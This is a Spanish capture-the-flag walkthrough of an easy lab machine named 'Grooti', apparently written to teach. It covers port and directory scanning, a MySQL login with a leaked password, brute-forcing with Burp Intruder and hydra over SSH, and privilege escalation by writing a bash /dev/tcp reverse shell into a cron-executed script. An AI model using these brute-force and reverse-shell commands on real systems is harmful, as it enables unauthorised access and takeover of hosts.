---
description: '🧠Dificultad: Fácil | 🔓25/09/2025'
---

# Grooti

## 🕵️ Reconocimiento

Escaneamos los puertos de la máquina con nmap:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Tenemos una base de datos `mysql`, un servicio `http` y un `ssh`.

Si accedemos al `index.html`, encontramos un comentario en el código `html`:

```html
<!-- 
        I am Grooti...
        Creo que Rocket ha entrado a mi base de datos...
-->
```

En `/imagenes` encontramos un directory indexing con un `README.txt`:

```
(password1) Encuentra donde ponerla ;)
```

Si realizamos un escaneo de directorios, nos reporta lo siguiente:

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://172.17.0.2/FUZZ"
```

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Si accedemos al directorio `/secret` nos encontramos con esta página:

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

En las instrucciones que nos descargamos, vemos un comando escrito al final que nos sirve para entrar a la base de datos mysql:

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Probamos con la contraseña encontrada anteriormente (`password1`):

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Listando el contenido de la base de datos, encontramos una ruta que no conocíamos: `/unprivate/secret`.

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Si accedemos a dicha ruta, vemos esta página:

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

Si le hacemos fuerza bruta al campo donde se introduce el número (con `burpsuite` capturamos un request y lo mandamos al intruder), obtenemos que para el número `16` el response size es bastante mayor al normal. Si probamos a introducir un `16` en la web, nos descarga un `.zip` con el siguiente contenido:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Si usamos esta wordlist para el usuario `grooti`, obtenemos acceso a la máquina:

```bash
hydra -l grooti -P password16.txt ssh://$IPTARGET
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Una vez dentro, si listamos algunas carpetas donde podría haber algo interesante, encontramos un script en `/opt`:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Este script llama a otro que se encuentra en `/tmp`. Este último si lo podemos modificar porque tiene permisos de escritura para el grupo grooti.

Si le echamos un vistazo al `crontab`, vemos que este script se ejecuta cada minuto.

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Editamos el fichero `malicious.sh` con una reverse shell y esperamos.

```bash
bash -i >& /dev/tcp/172.17.0.1/9999 0>&1
```

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
